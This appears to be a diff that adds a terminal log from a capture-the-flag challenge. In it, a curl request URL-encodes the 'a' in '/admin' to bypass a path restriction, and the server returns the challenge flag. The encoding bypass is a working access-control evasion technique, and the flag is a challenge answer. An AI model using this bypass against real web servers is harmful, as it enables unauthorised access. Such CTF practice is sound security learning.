@@ -1,0 +1,3 @@
+┌──(santey22㉿santey22)-[~]
+└─$ curl 'http://chals.bitskrieg.in:25001/%61dmin/flag'
+{"flag":"BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}"}
